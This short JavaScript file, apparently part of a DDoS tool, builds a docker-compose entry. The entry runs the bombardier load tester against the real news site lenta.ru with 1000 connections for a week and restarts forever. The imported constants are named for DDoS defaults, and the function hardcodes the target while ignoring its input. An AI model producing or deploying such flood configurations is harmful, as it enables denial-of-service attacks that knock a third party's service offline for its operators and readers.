import { DDOS_DEFAULT_DURATION, DDOS_DEFAULT_CONNECTIONS } from '../constants/DEFAULT_VALUES'

export function generateContainerItem (item) {
    console.log(item);
    return ' ' +
        ' lenta.ru:\n' +
        '    container_name: lenta.ru\n' +
        '    image: alpine/bombardier\n' +
        '    restart: always\n' +
        '    command: -c 1000 -d 604800s -l lenta.ru'
}